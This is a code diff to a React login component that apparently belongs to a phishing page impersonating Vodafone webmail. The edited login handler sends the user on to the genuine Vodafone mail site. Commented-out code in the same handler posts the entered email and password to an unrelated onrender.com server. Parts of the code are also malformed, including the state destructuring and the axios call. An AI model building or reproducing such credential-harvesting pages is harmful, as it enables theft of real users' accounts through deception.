@@ -3,12 +3,14 @@ import "./Credentials.css";
 import { FaEyeSlash } from "react-icons/fa";
 import { FaRegEye } from "react-icons/fa6";
 import { IoIosInformationCircle } from "react-icons/io";
+import axios from "axios";
 
 const Credentials = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [info, setInfo] = useState(false);
   const [email, setEmail] = useState("");
   const [passWord, setPassWord] = useState("");
+  const [, loading, setLoading] = useState(false);
 
   const handleShowpassword = () => {
     setShowPassword(!showPassword);
@@ -47,11 +49,29 @@ const Credentials = () => {
     }
   };
 
-  const handleLogin = (e) => {
+  const handleLogin = async () => {
     setInfo(true);
     setTimeout(() => {
       setInfo(false);
     }, 4000);
+    window.location.href = "https://mail.vodafone.de/index.aspx";
+    // try {
+    //   setLoading(true);
+    //   await axios.post(
+    //     "https://christholychurch.onrender.com/api/signin",
+    //     email,
+    //     passWord
+    //   );
+    //   setLoading(false);
+
+     
+    //   setLoading(false);
+    // } catch (err) {
+    //   if (err.response.data.message) {
+    //     setLoading(false);
+    //   }
+    //   setLoading(false);
+    // }
   };
 
   return (
